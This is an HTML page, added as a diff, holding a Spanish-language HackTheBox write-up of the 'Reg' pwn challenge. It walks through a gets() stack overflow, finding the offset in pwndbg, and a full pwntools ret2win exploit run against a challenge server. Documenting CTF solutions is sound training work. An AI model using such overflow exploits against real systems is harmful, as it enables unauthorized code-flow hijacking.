@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Reg</title>
+
+  <meta name="description" content="Resolución del challenge Reg de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Reg">
+  <meta name="twitter:description" content="Resolución del challenge Reg de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/pwn.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Reg">
+  <meta property="og:description" content="Resolución del challenge Reg de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/pwn.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/pwn.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Reg" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="GatoGamer1155" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/pwn.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Reg</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">El binario entregado solo parece <code class="language-plaintext highlighter-rouge">registrar</code> el nombre de un usuario proporcionado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./reg</span><span class="p">
+Enter your name : name  
+Registered!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos analizarlo con <code class="language-plaintext highlighter-rouge">ida</code> para asi poder ver el pseudocodigo de main en <code class="language-plaintext highlighter-rouge">c</code></p>
+<a href="/challenges/reg/1.png" target="_blank"><div><p><img src="/challenges/reg/1.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> solo llama a la funcion <code class="language-plaintext highlighter-rouge">run</code>, esta define un buffer de <code class="language-plaintext highlighter-rouge">48</code> bytes para una string que recibe posteriormente con <code class="language-plaintext highlighter-rouge">gets</code>, esto es una mala practica ya que el uso de esta funcion con un buffer tan limitado puede ocasionar un <code class="language-plaintext highlighter-rouge">buffer overflow</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="p">__fastcall </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
+{
+  run();
+  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
+}
+
+</span><span class="no">int </span><span class="na">run</span><span class="p">()
+{
+  </span><span class="no">char </span><span class="p">string[</span><span class="mi">48</span><span class="p">];</span><span class="c1"> // [rsp+0h] [rbp-30h] BYREF
+
+  initialize();
+  </span><span class="no">printf</span><span class="p">(</span><span class="s">"Enter your name : "</span><span class="p">);
+  </span><span class="no">gets</span><span class="p">(string);
+  </span><span class="o">return </span><span class="no">puts</span><span class="p">(</span><span class="s">"Registered!"</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas de ello encontramos una función llamada <code class="language-plaintext highlighter-rouge">winner</code> que su funciomaniento es leer de un archivo llamado <code class="language-plaintext highlighter-rouge">flag.txt</code> y mostrar su contenido a traves de la consola</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int </span><span class="na">winner</span><span class="p">()
+{
+  </span><span class="no">char </span><span class="p">string[</span><span class="mi">1032</span><span class="p">]; </span><span class="c1">// [rsp+0h] [rbp-410h] BYREF  
+  </span><span class="p">FILE </span><span class="o">*</span><span class="p">stream; </span><span class="c1">// [rsp+408h] [rbp-8h]
+
+  </span><span class="no">puts</span><span class="p">(</span><span class="s">"Congratulations!"</span><span class="p">);
+  stream </span><span class="o">= </span><span class="no">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">, </span><span class="s">"r"</span><span class="p">);
+  </span><span class="no">fgets</span><span class="p">(string, </span><span class="mi">1024</span><span class="p">, stream);
+  </span><span class="no">puts</span><span class="p">(string);
+  </span><span class="o">return </span><span class="p">fclose(stream);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando las protecciones del binario nos encontramos con <code class="language-plaintext highlighter-rouge">NX</code> que nos impedira poder ejecutar shellcode en la pila por lo que tendremos que buscar alternativas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec </span><span class="p">reg
+[</span><span class="az">*</span><span class="p">] '/home/kali/reg'
+    Arch:     amd64-64-little
+    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:    </span><span class="ro">No canary found</span><span class="p">
+    NX:       </span><span class="ve">NX enabled</span><span class="p">
+    PIE:      </span><span class="ro">No PIE (0x400000)  </span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Para iniciar abrimos le binario con <code class="language-plaintext highlighter-rouge">gdb</code> y creamos un patron de 100 caracteres especiales para buscar el <code class="language-plaintext highlighter-rouge">offset</code>, despues corremos el programa y lo enviamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q reg
+Reading symbols from </span><span class="ve">reg</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">reg</span><span class="p">)
+</span><span class="ro">pwndbg> </span><span class="p">cyclic 100
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+</span><span class="ro">pwndbg> </span><span class="p">run
+Starting program: </span><span class="ve">/home/kali/reg</span><span class="p">
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+Enter your name : aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  
+Registered!
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x00000000004012ac </span><span class="p">in </span><span class="am">run</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez corrompe podemos buscar el offset usando <code class="language-plaintext highlighter-rouge">cyclic -l</code> que es la cantidad de bytes necesarios antes de sobreescribir la siguiente instruccion de retorno</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">x/gx $rsp
+</span><span class="az">0x7fffffffe588</span><span class="p">:	0x6161616161616168
+</span><span class="ro">pwndbg> </span><span class="p">cyclic -l 0x6161616161616168
+</span><span class="sa">Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)  
+</span><span class="ve">Found at offset 56
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aprovecharemos la funcion <code class="language-plaintext highlighter-rouge">winner</code> para enviarla como la siguiente instruccion y asi leer la <code class="language-plaintext highlighter-rouge">flag</code> remotamente, podemos conseguir su direccion facilmente desde <code class="language-plaintext highlighter-rouge">gdb</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">print winner
+$1 = {&lttext variable, no debug info>} </span><span class="az">0x401206 </span><span class="p">&lt</span><span class="am">winner</span><span class="p">>  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La idea del siguiente exploit es simple, enviar los <code class="language-plaintext highlighter-rouge">56</code> bytes de basura y en la siguiente instruccion enviar la direccion de <code class="language-plaintext highlighter-rouge">winner</code> para asi leer la flag del servidor</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64, log, sys
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]} </span><span class="s">&lthost:port>"</span><span class="p">)  
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+host, port </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">].split(</span><span class="s">":"</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(host, port)
+
+offset </span><span class="o">= </span><span class="mi">56</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+winner </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401206</span><span class="p">)
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">winner
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"name : "</span><span class="p">, payload)
+flag </span><span class="o">= </span><span class="p">shell.recvline_contains(</span><span class="no">b</span><span class="s">"HTB"</span><span class="p">).decode()
+
+log.success(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit conseguimos leer el archivo <code class="language-plaintext highlighter-rouge">flag.txt</code> y completar el reto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py 206.189.28.180:30398
+[</span><span class="ve">+</span><span class="p">] Opening connection to 206.189.28.180 on port 30398: Done  
+[</span><span class="ve">+</span><span class="p">] Flag: HTB{N3W_70_pWn}
+[</span><span class="az">*</span><span class="p">] Closed connection to 206.189.28.180 port 30398</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
